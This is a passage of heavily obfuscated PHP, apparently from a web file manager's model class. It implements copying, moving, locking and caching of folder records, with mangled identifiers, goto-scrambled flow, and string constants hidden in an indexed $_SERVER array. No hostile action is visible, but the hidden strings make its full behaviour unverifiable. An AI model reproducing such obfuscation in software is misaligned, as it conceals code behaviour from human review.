$BéÅÓæÔ° = array_reverse($this->parentLevelArray($dÕ–»šƒ½¥[$_SERVER[›èö’ù¤][516]])); foreach ($BéÅÓæÔ° as $cÇ÷ÏŞ«Û) { $this->_lockEvent($cÇ÷ÏŞ«Û, $cùÈñçŒìŸ, $BÖçŞ¤×èï); } } private function _lockEvent($bßƒÙ…ÌŒÉ, $a·ë„Ø–î, $bÎî°Ü›Î) { $C³¥¦È•˜ =& $_SERVER[›èö’ù¤]; if (!$this->autoLockSet) { return; } foreach ($a·ë„Ø–î as $E…ãë¹²çÚ) { $Cœ–®ÌÇÖ = $E…ãë¹²çÚ . $C³¥¦È•˜[95] . $bßƒÙ…ÌŒÉ; if ($bÎî°Ü›Î && CacheLock::lockGet($C³¥¦È•˜[554] . $Cœ–®ÌÇÖ)) { continue; } $this->_lockKey($Cœ–®ÌÇÖ, $bÎî°Ü›Î); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($b×í’ì–¨, $dî¦íËçÙ = 1) { $bà²ô¬İ†Š = $_SERVER[›èö’ù¤][554] . md5($b×í’ì–¨); if ($dî¦íËçÙ) { if (isset(self::$_lockItemArr[$bà²ô¬İ†Š])) { return; } self::$_lockItemArr[$bà²ô¬İ†Š] = 1; CacheLock::lock($bà²ô¬İ†Š, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$bà²ô¬İ†Š])) { return; } unset(self::$_lockItemArr[$bà²ô¬İ†Š]); CacheLock::unlock($bà²ô¬İ†Š); } } public function isParentOf($F‘‹˜Ô—, $dÏÕ˜Ù”½Ş) { goto aå´·Íß“; aå´·Íß“: $DŠ™æÏèŞØ =& $_SERVER[›èö’ù¤]; $FŒâá©±²§ = $this->sourceInfo($F‘‹˜Ô—); $bó‡ñˆ‡ğ¡ = $this->sourceInfo($dÏÕ˜Ù”½Ş); goto Fµ›Ü¢¾©; e…ëğ»ˆ£İ: return $fª…ËÍ«; goto Eª¹£íŒóœ; Fµ›Ü¢¾©: $DÙÚ´—‘õñ = $FŒâá©±²§[$DŠ™æÏèŞØ[516]] . $FŒâá©±²§[$DŠ™æÏèŞØ[397]] . $DŠ™æÏèŞØ[47]; $b„¯Ê‰‹‘¸ = $bó‡ñˆ‡ğ¡[$DŠ™æÏèŞØ[516]] . $bó‡ñˆ‡ğ¡[$DŠ™æÏèŞØ[397]] . $DŠ™æÏèŞØ[47]; $fª…ËÍ« = strpos($b„¯Ê‰‹‘¸, $DÙÚ´—‘õñ) === 0; goto e…ëğ»ˆ£İ; Eª¹£íŒóœ: } private $targetIsDelete = 0; public function copy($fÀÜÜô¢, $Bã×á„£ê, $F½Ş–ÁÉƒê = REPEAT_REPLACE, $FÆåƒ×á£ª = '') { goto c„ğ‰”†Î; c„ğ‰”†Î: $Dõù‡„§İˆ =& $_SERVER[›èö’ù¤]; $d§¿ÏÛ– = $this->sourceInfo($fÀÜÜô¢); $eé›­îâÂœ = $this->sourceInfo($Bã×á„£ê); goto cóí”×÷ª£; dÜ…÷ğ¢×Ó: $this->lockCopyStart($fÀÜÜô¢); $this->lockWriteStart($Bã×á„£ê, $aƒÓÁ¹¹); $C´‹…º÷»ó = array($Dõù‡„§İˆ[555] => array(), $Dõù‡„§İˆ[556] => array(), $Dõù‡„§İˆ[557] => array()); goto cŸÌ­¯È…º; cóí”×÷ª£: if (!$d§¿ÏÛ– || !$eé›­îâÂœ || $eé›­îâÂœ[$Dõù‡„§İˆ[405]] != $Dõù‡„§İˆ[87]) { return !1; } if ($this->isParentOf($fÀÜÜô¢, $Bã×á„£ê)) { return !1; } $aƒÓÁ¹¹ = $FÆåƒ×á£ª ? $FÆåƒ×á£ª : $d§¿ÏÛ–[$Dõù‡„§İˆ[28]]; goto dÜ…÷ğ¢×Ó; cŸÌ­¯È…º: $this->targetIsDelete = intval($d§¿ÏÛ–[$Dõù‡„§İˆ[425]]); $e¦¬»§š¶¢ = $this->fileNameExistCache($Bã×á„£ê, $d§¿ÏÛ–[$Dõù‡„§İˆ[28]]); $eæ¬‹ ÒÇŒ = $this->_copy($fÀÜÜô¢, $Bã×á„£ê, $F½Ş–ÁÉƒê, $C´‹…º÷»ó, !0, $FÆåƒ×á£ª); goto Dâ‡ì¼Í²; B¢­ÄÙáª‹: if ($d§¿ÏÛ–[$Dõù‡„§İˆ[405]] == $Dõù‡„§İˆ[87] && $e¦¬»§š¶¢ == $eæ¬‹ ÒÇŒ) { $this->folderSizeResetChildren($e¦¬»§š¶¢); } Model($Dõù‡„§İˆ[558])->addAll($C´‹…º÷»ó[$Dõù‡„§İˆ[556]], array(), !0); if ($e¦¬»§š¶¢ != $eæ¬‹ ÒÇŒ || $d§¿ÏÛ–[$Dõù‡„§İˆ[405]] == $Dõù‡„§İˆ[87]) { Model($Dõù‡„§İˆ[559])->eventCopy($eæ¬‹ ÒÇŒ); } goto bÚ‚ØàëÇñ; e©¬×ò”Ğ: $this->updateModifyTime($Bã×á„£ê); return $eæ¬‹ ÒÇŒ; goto FÈÃ¥¹â‘‡; bÚ‚ØàëÇñ: $this->saveAll($C´‹…º÷»ó[$Dõù‡„§İˆ[557]]); Model($Dõù‡„§İˆ[193])->linkAdd($C´‹…º÷»ó[$Dõù‡„§İˆ[555]]); $this->folderSizeReset($Bã×á„£ê); goto e©¬×ò”Ğ; Dâ‡ì¼Í²: $this->_childrenListClear(); $this->lockCopyEnd($fÀÜÜô¢); $this->lockWriteEnd($Bã×á„£ê, $aƒÓÁ¹¹); goto B¢­ÄÙáª‹; FÈÃ¥¹â‘‡: } private function _copy($C×Ã¿ëÍÂã, $fÈ®´£, $CÏ‹â»÷İµ, &$cøÅŸÊ¹§, $F‹®ŸÄÇ¾», $EŸòÂ÷É¦˜ = '') { goto bí‰Í´ó¬£; bí‰Í´ó¬£: $fÙÜ‡Œ‘¦î =& $_SERVER[›èö’ù¤]; $E‡Î¨¯ó›Ü = $this->sourceInfoCache($C×Ã¿ëÍÂã); $eÈÕ†øä„¢ = $E‡Î¨¯ó›Ü[$fÙÜ‡Œ‘¦î[405]] == $fÙÜ‡Œ‘¦î[87]; goto bçôÜç¤Ë; D¿å•ñ¹ƒì: if (!$bÔ–º‘Š“ ) { return $this->_copyCreate($C×Ã¿ëÍÂã, $fÈ®´£, $CáàÇ¤»‘, $cøÅŸÊ¹§); } $cîğËŠÓ‘° = $bÔ–º‘Š“ ; if ($eÈÕ†øä„¢) { if ($CÏ‹â»÷İµ == REPEAT_RENAME_FOLDER) { $CáàÇ¤»‘ = $this->fileNameAutoCache($fÈ®´£, $CáàÇ¤»‘, $CÏ‹â»÷İµ, $eÈÕ†øä„¢); $cîğËŠÓ‘° = $this->_copyCreate($C×Ã¿ëÍÂã, $fÈ®´£, $CáàÇ¤»‘, $cøÅŸÊ¹§); } else { $E»±„ÃßÄ = $this->_childrenList($C×Ã¿ëÍÂã); foreach ($E»±„ÃßÄ as $d£Ê´²¶Î) { $this->_copy($d£Ê´²¶Î[$fÙÜ‡Œ‘¦î[397]], $bÔ–º‘Š“ , $CÏ‹â»÷İµ, $cøÅŸÊ¹§, !1); } } } else { if ($CÏ‹â»÷İµ == REPEAT_RENAME || $CÏ‹â»÷İµ == REPEAT_RENAME_FOLDER) { $CáàÇ¤»‘ = $this->fileNameAutoCache($fÈ®´£, $CáàÇ¤»‘, $CÏ‹â»÷İµ, $eÈÕ†øä„¢); $cîğËŠÓ‘° = $this->_copyCreate($C×Ã¿ëÍÂã, $fÈ®´£, $CáàÇ¤»‘, $cøÅŸÊ¹§); } else { if ($CÏ‹â»÷İµ == REPEAT_REPLACE) { $Cë§Ç¡¿›à = $this->sourceInfoCache($bÔ–º‘Š“ ); $Aõø»Ÿ¯öÈ = $this->fileHistory($Cë§Ç¡¿›à, $E‡Î¨¯ó›Ü[$fÙÜ‡Œ‘¦î[462]], $E‡Î¨¯ó›Ü[$fÙÜ‡Œ‘¦î[78]]); if ($Aõø»Ÿ¯öÈ) { $cøÅŸÊ¹§[$fÙÜ‡Œ‘¦î[555]][] = $E‡Î¨¯ó›Ü[$fÙÜ‡Œ‘¦î[462]]; } } else { if ($CÏ‹â»÷İµ == REPEAT_SKIP) { } } } Hook::trigger($fÙÜ‡Œ‘¦î[560], array($fÙÜ‡Œ‘¦î[561], $E‡Î¨¯ó›Ü, 0)); } goto AÍ‰¿ˆ… ; bçôÜç¤Ë: $CáàÇ¤»‘ = $EŸòÂ÷É¦˜ ? $EŸòÂ÷É¦˜ : $E‡Î¨¯ó›Ü[$fÙÜ‡Œ‘¦î[28]]; $bÔ–º‘Š“  = $this->fileNameExistCache($fÈ®´£, $CáàÇ¤»‘); if ($F‹®ŸÄÇ¾») { $this->_childrenAllMake($C×Ã¿ëÍÂã); if ($eÈÕ†øä„¢ && $bÔ–º‘Š“ ) { $this->_childrenAllMake($bÔ–º‘Š“ ); } } goto D¿å•ñ¹ƒì; AÍ‰¿ˆ… : return $cîğËŠÓ‘°; goto cõßˆ‡×©˜; cõßˆ‡×©˜: } private function _copyCreate($CœÈñ®è¼¤, $aÜÂŸ˜È, $aØĞ¿áŒÏÀ, &$EË‹„ÓÚ¸ƒ) { goto b”ÀºŸ·Ú«; eÄ´à†¶Å: $E²âÜèíæ = $this->add($cİğ¤ë‹¶); $c’ë‘âÓÒ = array($aêá”æË¥Õ[397] => $E²âÜèíæ, $aêá”æË¥Õ[28] => $aØĞ¿áŒÏÀ); $this->_copyApplyMeta($c’ë‘âÓÒ, $EË‹„ÓÚ¸ƒ); goto A½ğ³–ĞæË; D–®–õëØ‰: $this->_childrenListAll($CœÈñ®è¼¤, $cÈ‘‹Ô); $e¤«ë†Ö™÷ = count($cÈ‘‹Ô); if ($e¤«ë†Ö™÷ == 0) { return $E²âÜèíæ; } goto CÕÌ°Ò’; CÕÌ°Ò’: $Fè‹²Â…ˆ› = $this->sourceInfo($E²âÜèíæ); foreach ($cÈ‘‹Ô as $EÖÃªâ ‹) { $dØõÆ¯×‘¯ = $this->_makeItemData($EÖÃªâ ‹, $Fè‹²Â…ˆ›, $EÖÃªâ ‹[$aêá”æË¥Õ[28]]); $dØõÆ¯×‘¯[$aêá”æË¥Õ[516]] = $EÖÃªâ ‹[$aêá”æË¥Õ[516]]; $D¦ôÏŞÜ”·[] = $dØõÆ¯×‘¯; } $this->chunkEventSet($aêá”æË¥Õ[565], array($aêá”æË¥Õ[566], $cİğ¤ë‹¶, $e¤«ë†Ö™÷)); goto CÚí®ˆ£¨Æ; CÚí®ˆ£¨Æ: $this->addAll($D¦ôÏŞÜ”·, array(), !1); $C¹ºÔÃëŠç = $this->where(array($aêá”æË¥Õ[493] => $E²âÜèíæ))->select(); $B´“Ìƒª„º = $this->_childrenMakeRelation($cÈ‘‹Ô, $C¹ºÔÃëŠç); goto C¿ÒÄˆ¸º¾; A½ğ³–ĞæË: if ($Fµ °‹Áî·[$aêá”æË¥Õ[405]] != $aêá”æË¥Õ[87]) { $EË‹„ÓÚ¸ƒ[$aêá”æË¥Õ[555]][] = $Fµ °‹Áî·[$aêá”æË¥Õ[462]]; return $E²âÜèíæ; } $cÈ‘‹Ô = array(); $D¦ôÏŞÜ”· = array(); goto D–®–õëØ‰; C¿ÒÄˆ¸º¾: $B´“Ìƒª„º[$CœÈñ®è¼¤] = $E²âÜèíæ; $d”´„•¹„Á = array(); $fÔ‡ºÜã‹Ô = array(); goto béØŒ”ƒ®¬; a®Ÿİ÷Œ“Ì: $this->chunkEventSet($aêá”æË¥Õ[569], array($aêá”æË¥Õ[570], $cİğ¤ë‹¶, $e¤«ë†Ö™÷)); $this->saveAll($fÔ‡ºÜã‹Ô); return $E²âÜèíæ; goto DÛƒÎ÷¥¨š; béØŒ”ƒ®¬: foreach ($C¹ºÔÃëŠç as $EÖÃªâ ‹) { $D¦²ß§‹øÀ = $EÖÃªâ ‹[$aêá”æË¥Õ[397]]; $CÛ¬™ÁÔí† = $this->_childrenMatch($B´“Ìƒª„º, $EÖÃªâ ‹, $Fè‹²Â…ˆ›); $d”´„•¹„Á[] = array($aêá”æË¥Õ[397], $D¦²ß§‹øÀ, $aêá”æË¥Õ[493], $CÛ¬™ÁÔí†[$aêá”æË¥Õ[493]]); $fÔ‡ºÜã‹Ô[] = array($aêá”æË¥Õ[397], $D¦²ß§‹øÀ, $aêá”æË¥Õ[516], $CÛ¬™ÁÔí†[$aêá”æË¥Õ[516]]); $this->_copyApplyMeta($EÖÃªâ ‹, $EË‹„ÓÚ¸ƒ); if ($EÖÃªâ ‹[$aêá”æË¥Õ[405]] != $aêá”æË¥Õ[87]) { $EË‹„ÓÚ¸ƒ[$aêá”æË¥Õ[555]][] = $EÖÃªâ ‹[$aêá”æË¥Õ[462]]; } } $this->chunkEventSet($aêá”æË¥Õ[567], array($aêá”æË¥Õ[568], $cİğ¤ë‹¶, $e¤«ë†Ö™÷)); $this->saveAll($d”´„•¹„Á); goto a®Ÿİ÷Œ“Ì; b”ÀºŸ·Ú«: $aêá”æË¥Õ =& $_SERVER[›èö’ù¤]; $Fµ °‹Áî· = $this->sourceInfoCache($CœÈñ®è¼¤); $b”ó×â’£‡ = $this->sourceInfoCache($aÜÂŸ˜È); goto E”ô£†„´Æ; E”ô£†„´Æ: $cİğ¤ë‹¶ = $this->_makeItemData($Fµ °‹Áî·, $b”ó×â’£‡, $aØĞ¿áŒÏÀ); Hook::trigger($aêá”æË¥Õ[562], $cİğ¤ë‹¶); Hook::trigger($aêá”æË¥Õ[563], array($aêá”æË¥Õ[564], $cİğ¤ë‹¶, 0)); goto eÄ´à†¶Å; DÛƒÎ÷¥¨š: } private function _childrenMakeRelation($Aöİ»•ôºÍ, $dø™Øùá‹) { $cÒãÛäŠ„Ë =& $_SERVER[›èö’ù¤]; $b–ìíÁ°¶´ = array(); $fˆª‡«³òá = array(); foreach ($Aöİ»•ôºÍ as $C…Šî•¢ê‚) { $Bâ›…Êì’ = $C…Šî•¢ê‚[$cÒãÛäŠ„Ë[28]] . $cÒãÛäŠ„Ë[8] . $C…Šî•¢ê‚[$cÒãÛäŠ„Ë[516]]; $b–ìíÁ°¶´[$Bâ›…Êì’] = $C…Šî•¢ê‚[$cÒãÛäŠ„Ë[397]]; } foreach ($dø™Øùá‹ as $C…Šî•¢ê‚) { $Bâ›…Êì’ = $C…Šî•¢ê‚[$cÒãÛäŠ„Ë[28]] . $cÒãÛäŠ„Ë[8] . $C…Šî•¢ê‚[$cÒãÛäŠ„Ë[516]]; $eô‰¨æê¥¸ = $b–ìíÁ°¶´[$Bâ›…Êì’]; $fˆª‡«³òá[$eô‰¨æê¥¸] = $C…Šî•¢ê‚[$cÒãÛäŠ„Ë[397]]; } return $fˆª‡«³òá; } private function _childrenMatch($aî”»¹ªÊ, $cÖË¦¥‘×, $f·¶¸¹ğË˜) { goto CËÓÒ÷ãÆª; BÃšå•¯£å: foreach ($B„ĞòÎÌÀ¿ as $EÈ©Ü¦–•») { if (isset($aî”»¹ªÊ[$EÈ©Ü¦–•»])) { $A…ªÈêÇµ .= $aî”»¹ªÊ[$EÈ©Ü¦–•»] . $E±­Ñ½ç[571]; } } $A…ªÈêÇµ = rtrim($A…ªÈêÇµ, $E±­Ñ½ç[47]) . $E±­Ñ½ç[47]; $B…ø„¦ŠÔ = $this->parentLevelArray($A…ªÈêÇµ); goto Cá†¡„Şå; Cá†¡„Şå: $E™ìÖÊËöÑ = $B…ø„¦ŠÔ[count($B…ø„¦ŠÔ) - 1]; return array($E±­Ñ½ç[493] => $E™ìÖÊËöÑ, $E±­Ñ½ç[516] => $A…ªÈêÇµ); goto eÒøƒµÍÒÄ; CËÓÒ÷ãÆª: $E±­Ñ½ç =& $_SERVER[›èö’ù¤]; $A…ªÈêÇµ = $f·¶¸¹ğË˜[$E±­Ñ½ç[516]]; $B„ĞòÎÌÀ¿ = $this->parentLevelArray($cÖË¦¥‘×[$E±­Ñ½ç[516]]); goto BÃšå•¯£å; eÒøƒµÍÒÄ: } private function _makeItemData($dÛ›¬¿µïì, $Dæ°îœ²Ö¼, $c®«ÊìĞó) { $Fé‰ê›ÇÀ =& $_SERVER[›èö’ù¤]; $Cİ¬ˆŞ¶Šº = array($Fé‰ê›ÇÀ[572] => $dÛ›¬¿µïì[$Fé‰ê›ÇÀ[405]], $Fé‰ê›ÇÀ[415] => $c®«ÊìĞó, $Fé‰ê›ÇÀ[573] => $dÛ›¬¿µïì[$Fé‰ê›ÇÀ[407]], $Fé‰ê›ÇÀ[463] => $dÛ›¬¿µïì[$Fé‰ê›ÇÀ[462]], $Fé‰ê›ÇÀ[574] => $dÛ›¬¿µïì[$Fé‰ê›ÇÀ[78]], $Fé‰ê›ÇÀ[575] => $Dæ°îœ²Ö¼[$Fé‰ê›ÇÀ[406]], $Fé‰ê›ÇÀ[576] => $Dæ°îœ²Ö¼[$Fé‰ê›ÇÀ[499]], $Fé‰ê›ÇÀ[577] => USER_ID, $Fé‰ê›ÇÀ[578] => USER_ID, $Fé‰ê›ÇÀ[396] => $Dæ°îœ²Ö¼[$Fé‰ê›ÇÀ[397]], $Fé‰ê›ÇÀ[579] => $Dæ°îœ²Ö¼[$Fé‰ê›ÇÀ[516]] . $Dæ°îœ²Ö¼[$Fé‰ê›ÇÀ[397]] . $Fé‰ê›ÇÀ[47], $Fé‰ê›ÇÀ[419] => $dÛ›¬¿µïì[$Fé‰ê›ÇÀ[84]], $Fé‰ê›ÇÀ[424] => 0, $Fé‰ê›ÇÀ[580] => $Fé‰ê›ÇÀ[33]); return $Cİ¬ˆŞ¶Šº; } private function _copyApplyMeta($cÕÊ“¦Üë , &$D£°î¯’óŒ) { $eÉ¿–›‚ğ¸ =& $_SERVER[›èö’ù¤]; $cØ¡Ô­‚›œ = $cÕÊ“¦Üë [$eÉ¿–›‚ğ¸[397]]; $b¯ŒÓğÌšæ = $cÕÊ“¦Üë [$eÉ¿–›‚ğ¸[28]]; if (!isset($cÕÊ“¦Üë [$eÉ¿–›‚ğ¸[581]]) || !$cÕÊ“¦Üë [$eÉ¿–›‚ğ¸[581]] || $cÕÊ“¦Üë [$eÉ¿–›‚ğ¸[581]] == $eÉ¿–›‚ğ¸[191]) { $D£°î¯’óŒ[$eÉ¿–›‚ğ¸[557]][] = array($eÉ¿–›‚ğ¸[397], $cØ¡Ô­‚›œ, $eÉ¿–›‚ğ¸[581], short_id($cØ¡Ô­‚›œ)); } if (Input::check($b¯ŒÓğÌšæ, $eÉ¿–›‚ğ¸[582])) { $D£°î¯’óŒ[$eÉ¿–›‚ğ¸[556]][] = array($eÉ¿–›‚ğ¸[397] => $cØ¡Ô­‚›œ, $eÉ¿–›‚ğ¸[93] => $eÉ¿–›‚ğ¸[459], $eÉ¿–›‚ğ¸[372] => str_replace($eÉ¿–›‚ğ¸[50], $eÉ¿–›‚ğ¸[33], Pinyin::get($b¯ŒÓğÌšæ))); $D£°î¯’óŒ[$eÉ¿–›‚ğ¸[556]][] = array($eÉ¿–›‚ğ¸[397] => $cØ¡Ô­‚›œ, $eÉ¿–›‚ğ¸[93] => $eÉ¿–›‚ğ¸[458], $eÉ¿–›‚ğ¸[372] => Pinyin::get($b¯ŒÓğÌšæ, $eÉ¿–›‚ğ¸[583])); } $D£°î¯’óŒ[$eÉ¿–›‚ğ¸[556]][] = array($eÉ¿–›‚ğ¸[397] => $cØ¡Ô­‚›œ, $eÉ¿–›‚ğ¸[93] => $eÉ¿–›‚ğ¸[437], $eÉ¿–›‚ğ¸[372] => KodSort::makeStr($b¯ŒÓğÌšæ)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($Dïƒ±œ¤Ç¥) { goto Aå™›®åÂÎ; eƒª•†Ôõ: $Dâßô÷–„ = array_to_keyvalue($Dâßô÷–„, $DÖÌ‰„Ìë‰[397]); foreach ($Dâßô÷–„ as $DÒ÷éï–Ö) { $C‘ ¸ø‰  = $DÒ÷éï–Ö[$DÖÌ‰„Ìë‰[493]]; $Dïƒ±œ¤Ç¥ = $DÒ÷éï–Ö[$DÖÌ‰„Ìë‰[397]]; if (!isset($this->_childrenListCache[$Dïƒ±œ¤Ç¥]) && $DÒ÷éï–Ö[$DÖÌ‰„Ìë‰[405]] == $DÖÌ‰„Ìë‰[87]) { $this->_childrenListCache[$Dïƒ±œ¤Ç¥] = array(); } if (!isset($this->_childrenListCache[$C‘ ¸ø‰ ])) { $this->_childrenListCache[$C‘ ¸ø‰ ] = array(); } $this->_childrenListCache[$C‘ ¸ø‰ ][$Dïƒ±œ¤Ç¥] = $DÒ÷éï–Ö; $this->_childrenItemCache[$Dïƒ±œ¤Ç¥] = $DÒ÷éï–Ö; } goto eÖä‚İ‚¶; Aå™›®åÂÎ: $DÖÌ‰„Ìë‰ =& $_SERVER[›èö’ù¤]; $EîµÒĞß÷ò = $this->sourceInfo($Dïƒ±œ¤Ç¥); $bßß»å‡è± = $DÖÌ‰„Ìë‰[584]; goto eòåÎÔ…‚ª; eòåÎÔ…‚ª: $Fí›¢œæä = array($DÖÌ‰„Ìë‰[516] => array($DÖÌ‰„Ìë‰[539], $EîµÒĞß÷ò[$DÖÌ‰„Ìë‰[516]] . $Dïƒ±œ¤Ç¥ . $DÖÌ‰„Ìë‰[540]), $DÖÌ‰„Ìë‰[425] => $this->targetIsDelete); $Dâßô÷–„ = $this->field($bßß»å‡è±)->where($Fí›¢œæä)->select(); if (!$Dâßô÷–„) { return; } goto eƒª•†Ôõ; eÖä‚İ‚¶: } private function _childrenListAll($CÜÑ”òÌ×Ø, &$B†…ß½æ—±) { $bˆ–®½‰ô˜ =& $_SERVER[›èö’ù¤]; if (!isset($this->_childrenListCache[$CÜÑ”òÌ×Ø])) { return; } $aÛÀªåã¥Ó = $this->_childrenListCache[$CÜÑ”òÌ×Ø]; foreach ($aÛÀªåã¥Ó as $BèÕ•½ß => $E‚åŠÊİøŒ) { $B†…ß½æ—±[$BèÕ•½ß] = $E‚åŠÊİøŒ; if ($E‚åŠÊİøŒ[$bˆ–®½‰ô˜[405]] == $bˆ–®½‰ô˜[87]) { $this->_childrenListAll($BèÕ•½ß, $B†…ß½æ—±); } } } private function sourceInfoCache($E³Çö«ß¾‡) { if (isset($this->_childrenItemCache[$E³Çö«ß¾‡])) { return $this->_childrenItemCache[$E³Çö«ß¾‡]; } return $this->sourceInfo($E³Çö«ß¾‡); } private function _childrenList($bìÂÎÏÏ¥Ş) { if (isset($this->_childrenListCache[$bìÂÎÏÏ¥Ş])) { return $this->_childrenListCache[$bìÂÎÏÏ¥Ş]; } return $this->_childrenListSelect($bìÂÎÏÏ¥Ş); } private function _childrenListSelect($D–µ„‡¦ãä) { goto DÁñÕˆ‚Ç; e„­¸÷‰™: $aÖ«¨Ö°àÛ = $aÖ«¨Ö°àÛ ? $aÖ«¨Ö°àÛ : array(); $FéÒ—Ú¡½ = array_to_keyvalue($aÖ«¨Ö°àÛ, $DÇá ¢ø¡[397]); $this->_childrenListCache[$D–µ„‡¦ãä] = $FéÒ—Ú¡½; goto döÍ†™ö”ˆ; DÁñÕˆ‚Ç: $DÇá ¢ø¡ =& $_SERVER[›èö’ù¤]; $EÁÄ¹Â‚˜ = array($DÇá ¢ø¡[493] => $D–µ„‡¦ãä, $DÇá ¢ø¡[425] => $this->targetIsDelete); $aÖ«¨Ö°àÛ = $this->where($EÁÄ¹Â‚˜)->select(); goto e„­¸÷‰™; döÍ†™ö”ˆ: foreach ($FéÒ—Ú¡½ as $D–µ„‡¦ãä => $C‚Çé¹‰¯î) { $this->_childrenItemCache[$D–µ„‡¦ãä] = $C‚Çé¹‰¯î; } return $FéÒ—Ú¡½; goto Eä†¬°ëî; Eä†¬°ëî: } private function fileNameExistCache($d«ÅäõöÛÜ, $EÇ„“ïæµï) { $b”»ÅÛ•‹ø =& $_SERVER[›èö’ù¤]; $EÇ„“ïæµï = strtolower($EÇ„“ïæµï); $aí†ĞÖâÎÂ = $this->_childrenList($d«ÅäõöÛÜ); foreach ($aí†ĞÖâÎÂ as $e¥·˜Ñå´Ÿ) { if ($EÇ„“ïæµï == strtolower($e¥·˜Ñå´Ÿ[$b”»ÅÛ•‹ø[28]])) { return $e¥·˜Ñå´Ÿ[$b”»ÅÛ•‹ø[397]]; } } return !1; } private function fileNameAutoCache($Dà˜İ‘îƒ, $f¹š¯§‹ˆ, $d×¬Ğ„äó, $c„±¥š÷¨›) { $E°›õ‚Äã =& $_SERVER[›èö’ù¤]; $Bòğ¼ÙŞ‡ë = $this->_childrenList($Dà˜İ‘îƒ); $CŠ×¯¼¾ˆà = array_to_keyvalue($Bòğ¼ÙŞ‡ë, $E°›õ‚Äã[33], $E°›õ‚Äã[28]); return $this->fileNameAutoGet($CŠ×¯¼¾ˆà, $f¹š¯§‹ˆ, $d×¬Ğ„äó, $c„±¥š÷¨›); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($fÈ±ø…ƒç‡, $AğøÍ½‰ÌÂ, $D©åŒ¬«à½ = REPEAT_REPLACE, $A¸ï‰Ì‰»¬ = '') { goto F¾à¨›ÄÕØ; F¾à¨›ÄÕØ: $c¦Å«·­‘× =& $_SERVER[›èö’ù¤]; $fé¬ÒÎ¾¯Í = $this->sourceInfo($fÈ±ø…ƒç‡); $bĞ“«‰˜õÄ = $this->sourceInfo($AğøÍ½‰ÌÂ); goto bëÂ˜•–æ; d‰œÊ—öèÈ: if ($fé¬ÒÎ¾¯Í[$c¦Å«·­‘×[493]] == $AğøÍ½‰ÌÂ && $A¸ï‰Ì‰»¬ != $fé¬ÒÎ¾¯Í[$c¦Å«·­‘×[28]]) { $C÷òöÊÔä = $this->fileNameExist($AğøÍ½‰ÌÂ, $A¸ï‰Ì‰»¬); if ($C÷òöÊÔä && $fé¬ÒÎ¾¯Í[$c¦Å«·­‘×[405]] == $c¦Å«·­‘×[191]) { goto a™¸ˆ’Ëº…; då¨Ñ«»»: $this->removeNow($fÈ±ø…ƒç‡, !1); $this->folderSizeReset($AğøÍ½‰ÌÂ); Hook::trigger($c¦Å«·­‘×[586], $cğƒÌ¡´Ú¾); goto cå‰¥„™”; a™¸ˆ’Ëº…: $DíËœø¨²´ = $this->sourceInfo($C÷òöÊÔä); $cğ‡ñºË¶Ğ = $this->fileHistory($DíËœø¨²´, $fé¬ÒÎ¾¯Í[$c¦Å«·­‘×[462]], $fé¬ÒÎ¾¯Í[$c¦Å«·­‘×[78]]); if (!$cğ‡ñºË¶Ğ) { Model($c¦Å«·­‘×[465])->remove($fé¬ÒÎ¾¯Í[$c¦Å«·­‘×[462]]); } goto då¨Ñ«»»; cå‰¥„™”: return $C÷òöÊÔä; goto FˆÔğï§§ø; FˆÔğï§§ø: } } $F½ÑÎŸÉ¾Ñ = $A¸ï‰Ì‰»¬ ? $A¸ï‰Ì‰»¬ : $fé¬ÒÎ¾¯Í[$c¦Å«·­‘×[28]]; $this->lockMoveStart($fÈ±ø…ƒç‡); goto a›Õ¡è„á„; bëÂ˜•–æ: if ($fé¬ÒÎ¾¯Í[$c¦Å«·­‘×[493]] == $bĞ“«‰˜õÄ[$c¦Å«·­‘×[397]]) { if ($fé¬ÒÎ¾¯Í[$c¦Å«·­‘×[425]] == $c¦Å«·­‘×[87]) { Model($c¦Å«·­‘×[423])->restore(array($fÈ±ø…ƒç‡)); } if (!$A¸ï‰Ì‰»¬ || $A¸ï‰Ì‰»¬ == $fé¬ÒÎ¾¯Í[$c¦Å«·­‘×[28]]) { return $fÈ±ø…ƒç‡; } } $cğƒÌ¡´Ú¾ = $this->pathInfoMore($fÈ±ø…ƒç‡); if ($this->isParentOf($fÈ±ø…ƒç‡, $AğøÍ½‰ÌÂ)) { return !1; } goto B™¬²ÊÑâ¾; aå“åéËŸ: $DÍî²²»ö¢ = $this->fileNameExistCache($AğøÍ½‰ÌÂ, $fé¬ÒÎ¾¯Í[$c¦Å«·­‘×[28]]); $F»¾ÔÇ³Ÿ = $this->_move($fÈ±ø…ƒç‡, $AğøÍ½‰ÌÂ, $D©åŒ¬«à½, $E‰ÒÈõ”›, $A¸ï‰Ì‰»¬); $this->sourceCacheClear(); goto fÙÀù³‡ÁÍ; AĞ ‘°¦Öß: $this->folderSizeReset($AğøÍ½‰ÌÂ); $fŸŠ†İÍ¨ = array($fé¬ÒÎ¾¯Í[$c¦Å«·­‘×[493]], $AğøÍ½‰ÌÂ); if ($fé¬ÒÎ¾¯Í[$c¦Å«·­‘×[405]] == $c¦Å«·­‘×[87]) { $fŸŠ†İÍ¨[] = $fÈ±ø…ƒç‡; } goto f¤ªøâŞÔ’; B™¬²ÊÑâ¾: if (!$fé¬ÒÎ¾¯Í || !$bĞ“«‰˜õÄ || $bĞ“«‰˜õÄ[$c¦Å«·­‘×[405]] != $c¦Å«·­‘×[87]) { return !1; } Hook::trigger($c¦Å«·­‘×[585], $cğƒÌ¡´Ú¾); $this->targetIsDelete = intval($fé¬ÒÎ¾¯Í[$c¦Å«·­‘×[425]]); goto d‰œÊ—öèÈ; C¼ç¾ĞÕœ: $this->lockMoveEnd($fÈ±ø…ƒç‡); $this->lockWriteEnd($AğøÍ½‰ÌÂ, $F½ÑÎŸÉ¾Ñ); $this->folderSizeReset($fé¬ÒÎ¾¯Í[$c¦Å«·­‘×[493]]); goto AĞ ‘°¦Öß; a›Õ¡è„á„: $this->lockWriteStart($AğøÍ½‰ÌÂ, $F½ÑÎŸÉ¾Ñ); $E‰ÒÈõ”› = array($c¦Å«·­‘×[555] => array(), $c¦Å«·­‘×[587] => !1); $this->clearShare($fÈ±ø…ƒç‡, $AğøÍ½‰ÌÂ); goto aå“åéËŸ; E¶‚¥Í¡’»: return $F»¾ÔÇ³Ÿ; goto fÙï–ÍˆÒ; 